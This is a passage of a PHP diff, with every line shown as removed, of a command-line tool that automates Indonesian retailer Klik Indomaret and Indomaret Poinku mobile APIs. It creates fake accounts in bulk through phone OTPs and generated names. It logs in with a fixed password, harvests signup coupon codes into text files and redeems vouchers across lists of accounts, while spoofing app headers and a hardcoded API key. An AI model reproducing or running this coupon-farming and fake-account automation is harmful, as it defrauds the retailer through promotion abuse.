-											$addproduk2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=2&pId=798a7a04-5b24-493e-b375-a1407f4f716a&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-											$stt2 = json_decode($addproduk2[1])[0]->Message;
-											$SCID = json_decode($addproduk[1])[0]->ResponseID;
-											echo @color('green', "{$stt2}\n");
-										}
-										$listvc = file_get_contents('vocer25k');
-										$akunxxx1 = explode(';', trim($listvc));
-										$vocer = trim($akunxxx1[0]);
-										$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . urut(16) . '","ShoppingCartPackageID":null}';
-										$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-										$kimak = json_decode($kupon[1]);
-										$ket = $kimak->ResponseObject->keterangan;
-										if (strpos($kupon[1], '"status":"SUCCESS"')) {
-											echo @color('green', "BERHASIL GAN\n");
-											echo @color('nevy', "{$ket}\n");
-											echo @color('blue', "{$nomor}\n");
-											echo @color('yellow', "Akun berhasil disimpan di akunklikbervocer.txt\n");
-											save("{$nomor}\n", "akunklikbervocer.txt");
-										} elseif (strpos($kupon[1], 'ShopingCart tidak boleh kosong')) {
-											goto tempelllx;
-										} else {
-											echo @color('red', "{$ket}\n");
-										}
-									}
-								} else {
-									echo "{$responx}\n";
-								}
-							} else {
-								goto awalmula;
-							}
-						} else {
-							echo @color('red', "GAGAL\n");
-						}
-					} else {
-						echo @color('red', "GAGAL MENGIRIM EMAIL\n");
-					}
-				} else {
-					echo @color('red', "GAGAL REGIS\n");
-				}
-			}
-		} else {
-			goto ngotepe;
-		}
-		unlink('nganue.txt');
-		break;
-	case '2':
-		$password = "123456a";
-		// echo @color('green', "REFF : ");
-		$referral = "";
-		regis:
-		echo @color('green', "\nNOMOR : ");
-		$nomorr = trim(fgets(STDIN));
-		$nomor = str_replace("628", "08", $nomorr);
-		$nomor = str_replace('+', "", $nomor);
-		$deviceid = urut16();
-		$device_id = str_replace('-', '', $deviceid);
-		$headers = array();
-		$headers[] = 'Host: api.klikindomaret.com';
-		$headers[] = 'accept: */*';
-		$headers[] = 'content-type: application/json';
-		$headers[] = 'user-agent: okhttp/3.12.1';
-		################################################
-		$cekno = curl('https://api.klikindomaret.com/api/Customer/GetByMobilePhone?mobilePhone=' . $nomor, null, $headers);
-		sleep(1);
-		################################################
-		$sendotp = curl('https://api.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=' . $nomor, null, $headers);
-		sleep(1);
-		$hasil = json_decode($sendotp[1]);
-		$message = $hasil[0]->Message;
-		if ($message != "Kode OTP berhasil dikirim ke nomor telepon Anda.") {
-			echo @color('red', "{$sendotp[1]}\n");
-			goto regis;
-			die;
-		}
-		#################################################
-		echo @color('green', "OTP   : ");
-		$otp = trim(fgets(STDIN));
-		$validotp = curl('https://api.klikindomaret.com/api/PreRegistration/ValidationOTPCodeSMS?NoHP=' . $nomor . '&otpCode=' . $otp, null, $headers);
-		$hasil = json_decode($validotp[1]);
-		$message = $hasil[0]->Message;
-		echo @color('yellow', "{$message}\n");
-		sleep(1);
-		#################################################
-		$getdev = curl('https://api.klikindomaret.com/api/MobileAppsVersion/getDevice_Token?device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad', null, $headers);
-		$hasil = json_decode($getdev[1]);
-		$mfp_id = $hasil->Message;
-		#################################################
-		sleep(1);
-		$data = file_get_contents("https://irfan.iproute.my.id/asu.php");
-		$datas = json_decode($data);
-		$nama = $datas->fullname2;
-		$email = $datas->email;
-		$rand = rand(11, 30);
-		$dates = "1996-01-{$rand}";
-		$datapost = '{"FName":"' . $nama . '","LName":"","Email":null,"KonfirmasiEmail":"","Gender":"Wanita","Mobile":"' . $nomor . '","KodeReferensi":"' . $referral . '","Password":"' . $password . '","ConfirmPassword":"' . $password . '","IsConfirmed":true,"district":{"id":2483,"name":"Gunung Sahari Selatan"},"isShowPassword":false,"isShowPasswordConfirm":false,"errorMessageEmail":null,"errorMessagePassword":"","errorMessageConfirmPassword":"","isCodeRefMinReq":true,"isRefferalCode":true,"isCodeRefInputNull":false,"messageReferral":"Hore, berhasil menggunakan kode referensi!","ReferrerCode":"' . $referral . '","isReferralActive":true,"ID":"00000000-0000-0000-0000-000000000000","IPAddress":"192.168.56.132","IsSubscribed":0,"IsNewsLetterSubscriber":0,"AllowSMS":false,"LastUpdate":"0001-01-01T00:00:00","DateOfBirth":"' . $dates . 'T00:00:00.000Z","DateOfBirthStringFormatted":"' . $dates . '","TypePushEmail":0,"IsUpload":false,"IsActivated":false,"MobileVerified":true,"DateOfBirthExists":"0001-01-01T00:00:00","OTPValidationExpired":false,"IsFromOtherSystem":false,"OTPCount":0,"OTPAvailable":0,"DeviceID":"' . $device_id . '"}';
-		$post = strlen($datapost);
-		$headers2 = array();
-		$headers2[] = 'Host: prd-api.klikindomaret.com';
-		$headers2[] = 'accept: */*';
-		$headers2[] = 'content-type: application/json';
-		$headers2[] = 'user-agent: okhttp/3.12.1';
-		$headers2[] = 'content-length: ' . $post;
-		$regisan = curl('https://prd-api.klikindomaret.com/Account/Customer/Registration?districtID=46826&mfp_id=' . $mfp_id, $datapost, $headers2);
-		$jsregis = json_decode($regisan[1]);
-		$Message = $jsregis->message;
-		sleep(1);
-		if ($Message != "OK") {
-			echo @color('red', "\n{$regisan[1]}\n");
-			echo @color('red', "GAGAL CREATE\n");
-			goto regis;
-			die;
-		}
-		#################################################
-		$datapost2 = '{"Email":"' . $nomor . '","Password":"' . $password . '"}';
-		$post2 = strlen($datapost2);
-		$headers3 = array();
-		$headers3[] = 'Host: account-api-v2.klikindomaret.com';
-		$headers3[] = 'accept: */*';
-		$headers3[] = 'content-type: application/json';
-		$headers3[] = 'user-agent: okhttp/3.12.1';
-		$headers3[] = 'content-length: ' . $post2;
-		$login = curl('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=740f4707bebcf74f9b7c25d48e3358945f6aa01da5ddb387462c7eaf61bb78ad&districtID=51409&TrafficSource=', $datapost2, $headers3);
-		$datalogin = json_decode($login[1]);
-		$Message = $datalogin->Message;
-		$nama = $datalogin->ResponseObject->FName;
-		$date = $datalogin->ResponseObject->DateOfBirth;
-		echo @color('green', "Message : {$Message}\n");
-		echo @color('green', "Nama	: {$nama}\n");
-		echo @color('green', "Date	: {$date}\n");
-		if ($Message == "Nomor ponsel atau kata sandi Anda tidak valid") {
-			echo @color('red', "\n\n{$login[1]}\n\n");
-			goto regis;
-			die;
-		}
-		save("{$nomor};{$password};{$device_id}\n", 'akunklik.txt');
-		
-		$respi = json_decode($login[1]);
-		$respid = $respi->ResponseID;
-		$idne = $respi->ResponseObject->ID;
-		$toked = $respi->ResponseObject->Token;
-		#################################################
-		$kuntul2 = array();
-		$kuntul2[] = 'Content-Type: application/json';
-		$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-		$kuntul2[] = 'Applicationkey: indomaret';
-		$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-		$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-		$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-		$respon = $cekvcne[1];
-		if (strpos($respon, '"IsActivated":true')) {
-			$cok = json_decode($respon);
-			$ID = $cok[0]->ID;
-			$RegionId = $cok[0]->RegionId;
-			$storeid = $cok[0]->StoreDefault;
-			$notip = curl('https://api.klikindomaret.com/api/Customer/GetInboxByUser?id=' . $ID . '&mfp_id=' . $respid . '&pages=1&NotifType=&ChildNotifType=&RangeDays=', null, $headers);
-			$pesan = json_decode($notip[1]);
-			foreach ($pesan[0]->InboxData as $inbox) {
-				#
-				$Description = $inbox->Description;
-				$pecah = explode(".", $Description);
-				$desc1 = $pecah[0];
-				$CouponCode = $inbox->DetailInfo->CouponCode;
-				$CouponPeriode = $inbox->DetailInfo->CouponPeriode;
-				echo @color('green', "Pesan   : ");
-				echo @color('nevy', $desc1 . "\n");
-				echo @color('green', "Kode	: ");
-				echo @color('nevy', $CouponCode . "\n");
-				echo @color('green', "Berlaku : ");
-				echo @color('nevy', $CouponPeriode . "\n");
-				save("{$nomor};{$password};{$CouponCode};{$device_id}\n", 'akunberkupon.txt');
-				echo @color('yellow', "Tersimpan di akunberkupon.txt\n");
-				goto regis;
-			}
-		} else {
-			echo @color('red', $respon . "\n");
-		}
-		goto regis;
-		break;
-	case '3':
-		echo @color('yellow', "MENU:\n");
-		echo @color('yellow', "[1] AKUN BERHASIL REDEEM\n");
-		echo @color('yellow', "[2] AKUN GAGAL REDEEM\n");
-		echo @color('yellow', "PILIH : ");
-		$milihe = trim(fgets(STDIN));
-		switch ($milihe) {
-			case '1':
-				masalx:
-				echo "[+] Input File: ";
-				$file = trim(fgets(STDIN));
-				if (empty($file) || !file_exists($file)) {
-					echo "[+] File not found!\n";
-					goto masalx;
-				}
-				$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-				$no = 1;
-				$total = count($list) - 1;
-				$success = 0;
-				$error = 0;
-				foreach ($list as $kode) {
-					if (empty($kode)) {
-						continue;
-					}
-					echo "Total: {$no}/{$total}\n";
-					$akunxx = explode(';', trim($kode));
-					$nomor = trim($akunxx[0]);
-					$uuid = trim($akunxx[1]);
-					$pin = trim($akunxx[2]);
-					$xoxo = array();
-					$xoxo[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-					$xoxo[] = 'apps: {"app_version":"3.9.3","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-					$xoxo[] = 'Host: edtsapp.indomaretpoinku.com';
-					$xoxo[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-					$xoxo[] = 'Content-Type: application/json; charset=UTF-8';
-					$login = curl('https://edtsapp.indomaretpoinku.com/login/api/open/pin/validate-pin', '{"phoneNumber":"' . $nomor . '","deviceId":"' . $uuid . '","pinCode":"' . $pin . '"}', $xoxo);
-					if (strpos($login[1], '"message":"Success"')) {
-						$data = json_decode($login[1]);
-						$xx = $data->data->access_token;
-						$tempikkk = array();
-						$tempikkk[] = 'Authorization: Bearer ' . $xx;
-						$tempikkk[] = 'Key: ZWR0czIwMjE6MHBsbW9rbg==';
-						$tempikkk[] = 'Apps: {"app_version":"3.9.3","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-						$tempikkk[] = 'Connection: Keep-Alive';
-						$tempikkk[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-						cekkkvc:
-						$getkpn = curl('https://edtsapp.indomaretpoinku.com/coupon/api/mobile/coupons/has-new-coupon', null, $tempikkk);
-						if (strpos($getkpn[1], '"hasNewCoupon":true')) {
-							$cek = curl('https://edtsapp.indomaretpoinku.com/coupon/api/mobile/coupons?unpaged=true', null, $tempikkk);
-							if (strpos($cek[1], '"message":"Success"')) {
-								$list = json_decode($cek[1]);
-								if ($list->data->content == null) {
-									echo "delay..\n";
-									sleep(5);
-									goto cekkkvc;
-								} else {
-									save("===========================\n" . $nomor . "\n", 'vocerlain.txt');
-									foreach ($list->data->content as $mydata) {
-										echo color('nevy', "{$mydata->couponName} =>  ");
-										echo color('green', "{$mydata->couponCode}\n");
-										if ($mydata->couponName == "Diskon Rp 25.000 Klik Indomaret") {
-											save($nomor . ";" . $mydata->couponCode . "\n", 'akunvocer25k.txt');
-											echo color('yellow', "Tersimpan di akunvocer25k.txt\n");
-											file_put_contents('vocer25k', $mydata->couponCode);
-										} elseif ($mydata->couponName == "Diskon Produk Roti") {
-											save($nomor . ";" . $mydata->couponCode . "\n", 'akunvocerROTI.txt');
-											echo color('yellow', "Tersimpan di akunvocerROTI.txt\n");
-										}
-										save($mydata->couponName . ";" . $mydata->couponCode . "\n", 'vocerlain.txt');
-									}
-								}
-								save("===========================\n", 'vocerlain.txt');
-								save($nomor . ";" . $uuid . ";112233\n", 'akunadavocer.txt');
-							} else {
-								echo color('red', "{$cek[1]}\n");
-								goto cekkkvc;
-							}
-						} else {
-							echo color('red', "{$getkpn[1]}\n");
-						}
-					} else {
-						echo @color('red', "GAGAL LOGIN\n");
-					}
-					$no++;
-				}
-				break;
-			case '2':
-				massalx:
-				echo "[+] Input File: ";
-				$file = trim(fgets(STDIN));
-				if (empty($file) || !file_exists($file)) {
-					echo "[+] File not found!\n";
-					goto massalx;
-				}
-				$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-				$no = 1;
-				$total = count($list) - 1;
-				$success = 0;
-				$error = 0;
-				foreach ($list as $kode) {
-					if (empty($kode)) {
-						continue;
-					}
-					echo "Total: {$no}/{$total}\n";
-					$akunxx = explode(';', trim($kode));
-					$nomor = trim($akunxx[0]);
-					$uuid = trim($akunxx[1]);
-					$pin = trim($akunxx[2]);
-					$xoxo = array();
-					$xoxo[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-					$xoxo[] = 'apps: {"app_version":"3.9.3","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-					$xoxo[] = 'Host: edtsapp.indomaretpoinku.com';
-					$xoxo[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-					$xoxo[] = 'Content-Type: application/json; charset=UTF-8';
-					$login = curl('https://edtsapp.indomaretpoinku.com/login/api/open/pin/validate-pin', '{"phoneNumber":"' . $nomor . '","deviceId":"' . $uuid . '","pinCode":"' . $pin . '"}', $xoxo);
-					if (strpos($login[1], '"message":"Success"')) {
-						$data = json_decode($login[1]);
-						$xx = $data->data->access_token;
-						$xoxos = array();
-						$xoxos[] = 'Host: edtsapp.indomaretpoinku.com';
-						$xoxos[] = 'authorization: Bearer ' . $xx;
-						$xoxos[] = 'key: ZWR0czIwMjE6MHBsbW9rbg==';
-						$xoxos[] = 'apps: {"app_version":"3.9.3","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-						$xoxos[] = 'content-type: application/json; charset=UTF-8';
-						$xoxos[] = 'content-length: 26';
-						$xoxos[] = 'accept-encoding: gzip';
-						$xoxos[] = 'user-agent: okhttp/5.0.0-alpha.2';
-						echo color('yellow', "KODE TOKO: ");
-						$tokox = trim(fgets(STDIN));
-						$toko = strtoupper($tokox);
-						$kodexv = curl('https://edtsapp.indomaretpoinku.com/coupon/api/mobile/gift/redeem', '{"couponPromoCode":"' . $toko . '"}', $xoxos);
-						if (strpos($kodexv[1], '"message":"Success"')) {
-							echo @color('green', "{$kodexv[1]}\n");
-							$tempikkk = array();
-							$tempikkk[] = 'Authorization: Bearer ' . $xx;
-							$tempikkk[] = 'Key: ZWR0czIwMjE6MHBsbW9rbg==';
-							$tempikkk[] = 'Apps: {"app_version":"3.9.3","device_class":"Phone","device_family":"Samsung SMG988B","device_id":"' . $uuid . '","os_name":"Android Q","os_version":"Android 10"}';
-							$tempikkk[] = 'Connection: Keep-Alive';
-							$tempikkk[] = 'User-Agent: okhttp/5.0.0-alpha.2';
-							cekkkvcx:
-							$getkpn = curl('https://edtsapp.indomaretpoinku.com/coupon/api/mobile/coupons/has-new-coupon', null, $tempikkk);
-							if (strpos($getkpn[1], '"hasNewCoupon":true')) {
-								$cek = curl('https://edtsapp.indomaretpoinku.com/coupon/api/mobile/coupons?unpaged=true', null, $tempikkk);
-								if (strpos($cek[1], '"message":"Success"')) {
-									$list = json_decode($cek[1]);
-									if ($list->data->content == null) {
-										echo "delay..\n";
-										sleep(5);
-										goto cekkkvcx;
-									} else {
-										save("===========================\n" . $nomor . "\n", 'vocerlain.txt');
-										foreach ($list->data->content as $mydata) {
-											echo color('nevy', "{$mydata->couponName} =>  ");
-											echo color('green', "{$mydata->couponCode}\n");
-											if ($mydata->couponName == "Diskon Rp 25.000 Klik Indomaret") {
-												save($nomor . ";" . $mydata->couponCode . "\n", 'akunvocer25k.txt');
-												echo color('yellow', "Tersimpan di akunvocer25k.txt\n");
-												file_put_contents('vocer25k', $mydata->couponCode);
-											} elseif ($mydata->couponName == "Diskon Produk Roti") {
-												save($nomor . ";" . $mydata->couponCode . "\n", 'akunvocerROTI.txt');
-												echo color('yellow', "Tersimpan di akunvocerROTI.txt\n");
-											}
-											save($mydata->couponName . ";" . $mydata->couponCode . "\n", 'vocerlain.txt');
-										}
-									}
-									save("===========================\n", 'vocerlain.txt');
-									save($nomor . ";" . $uuid . ";112233\n", 'akunadavocer.txt');
-								} else {
-									echo color('red', "{$cek[1]}\n");
-									goto cekkkvcx;
-								}
-							} else {
-								echo color('red', "{$getkpn[1]}\n");
-							}
-						} else {
-							echo @color('red', "{$kodexv[1]}\n");
-							echo @color('red', "COBA LAGI NANTI\n");
-						}
-					} else {
-						echo @color('red', "{$login[1]}\n");
-						echo @color('red', "GAGAL LOGIN\n");
-					}
-					$no++;
-				}
-				break;
-			default:
-				break;
-		}
-		break;
-	case '4':
-		masalxx:
-		echo "[+] Masukkan kode toko: ";
-		$kodetokox = trim(fgets(STDIN));
-		echo "[+] Masukkan Password: ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxx;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$vocer = trim($akunxx[1]);
-			$device_id = trim($akunxx[2]);
-			if ($device_id == null) {
-				$device_id = urut(16);
-			}
-			tempelll:
-			// $kodetokox = "TB01";
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curl('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetokox . '","StoreCodeDest":""}', $kuntul2);
-					echo "{$setaddress[1]}\n";
-					$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetokox . '&AddressType=0&CustomerAddressID=00000000-0000-0000-0000-000000000000&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-					// for ($i=0; $i < 1; $i++) {
-					// $addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID='.$RegionId.'&scId=&cId='.$ID.'&cartRef=mobile&mod=add&id=&isPair=false&mfp_id='.$respid.'&qty=2&pId=3a0f3388-018f-4d63-9baf-51ded26e2f43&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode='.$kodetokox.'&StoreCodeDest=', null, $kuntul);
-					// $stt = json_decode($addproduk[1])[0]->Message;
-					// $SCID = json_decode($addproduk[1])[0]->ResponseID;
-					// echo @color('green', "$stt\n");
-					// $addproduk2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID='.$RegionId.'&scId=&cId='.$ID.'&cartRef=mobile&mod=add&id=&isPair=false&mfp_id='.$respid.'&qty=2&pId=798a7a04-5b24-493e-b375-a1407f4f716a&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode='.$kodetokox.'&StoreCodeDest=', null, $kuntul);
-					// $stt2 = json_decode($addproduk2[1])[0]->Message;
-					// $SCID = json_decode($addproduk[1])[0]->ResponseID;
-					// echo @color('green', "$stt2\n");
-					// }
-					$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $scid . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . $device_id . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-						echo @color('yellow', "Akun berhasil disimpan di akunklikbervocer.txt\n");
-						save("{$nomor}\n", "akunklikbervocer.txt");
-					} elseif (strpos($kupon[1], 'ShopingCart tidak boleh kosong')) {
-						goto tempelll;
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			$no++;
-		}
-		break;
-	case '5':
-		masalxxx:
-		echo "Masukkan kode toko: ";
-		$kodetoko = trim(fgets(STDIN));
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxxx;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$vocer = trim($akunxx[1]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			// echo @color('purple', "\n\n$verif[1]\n\n");
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					if ($scid !== []) {
-						$SCID = $scid;
-					}
-					$getaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-					if ($getaddress[1] == '[]') {
-						$addid = '00000000-0000-0000-0000-000000000000';
-					} else {
-						$addidx = json_decode($getaddress[1]);
-						$addid = $addidx[0]->ID;
-						$longe = $addidx[0]->Longitude;
-						$late = $addidx[0]->Latitude;
-					}
-					echo @color('yellow', "DAFTAR HIDANGAN :\n");
-					echo @color('red', "[1] Antar\n");
-					echo @color('yellow', "[2] Ambil\n");
-					echo @color('yellow', "pilih : ");
-					$ambil = trim(fgets(STDIN));
-					switch ($ambil) {
-						case '1':
-							$setaddress = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=&AddressType=1&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=' . $late . '&CustomerLongitude=' . $longe, null, $kuntul);
-							echo "{$setaddress[1]}\n";
-							break;
-						case '2':
-							$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetoko . '","StoreCodeDest":""}', $kuntul2);
-							// echo "$setaddress[1]\n";
-							$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetoko . '&AddressType=0&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-							break;
-					}
-					pilihproduk:
-					echo @color('yellow', "DAFTAR HIDANGAN :\n");
-					echo @color('yellow', "[1] Rose Brand Gula Pasir Putih 1Kg\n");
-					echo @color('yellow', "[2] Sunlight Cairan Pencuci Piring Jeruk Nipis 755Ml\n");
-					echo @color('yellow', "[3] Bear Brand,Susu Encer Steril  189Ml Klg\n");
-					echo @color('yellow', "[4] Bimoli,Minyak Goreng Special Refill  2000Ml Pch\n");
-					echo @color('yellow', "[5] Filma,Minyak Goreng Refill  2000Ml Pch\n");
-					echo @color('yellow', "[6] Fortune,Minyak Goreng Refill  2000Ml Pch\n");
-					echo @color('yellow', "[7] Rose Brand,Gula Pasir Kuning 1Kg Pck\n");
-					echo @color('yellow', "[8] Sania,Minyak Goreng Refill  2000Ml Pch\n");
-					echo @color('yellow', "[9] Sovia,Minyak Goreng  2L Pch\n");
-					echo @color('yellow', "[10] Sunlight,Cairan Pcuci Piring Ref 65976 Jeruk Nipis 210/220Ml Pch\n");
-					echo @color('yellow', "[11] Tropical,Minyak Goreng  2000Ml Btl\n");
-					echo @color('yellow', "[12] Tropical,Minyak Goreng Refill  2000Ml Pch\n");
-					echo @color('yellow', "[13] Sgm Eksplor 1+ Progressmax Madu\n");
-					echo @color('yellow', "[14] Sgm Eksplor 1+ Progressmax Vanilla\n");
-					echo @color('yellow', "[15] Sgm Eksplor 3+ Progressmax Vanilla\n");
-					echo @color('yellow', "[16] Sgm Eksplor 3+ Progressmax Madu\n");
-					echo @color('yellow', "[17] Merries Pants Good Skin 26 ExtraLarge\n");
-					echo @color('yellow', "[18] Merries Pants Good Skin 26 Small\n");
-					echo @color('yellow', "[19] Merries Pants Good Skin 34 Medium\n");
-					echo @color('yellow', "[20] Merries Pants Good Skin 34 Large\n");
-					echo @color('yellow', "[21] Gulaku Gula Tebu (Putih) Premium 1000G\n");
-					echo @color('yellow', "[22] Ekonomi,Pencuci Piring Power Liquid Jeruk Nipis 765/760Ml Pch\n");
-					echo @color('yellow', "[23] Ekonomi,Pencuci Piring Power Liquid Siwak&Jrk Limau 780Ml Pch\n");
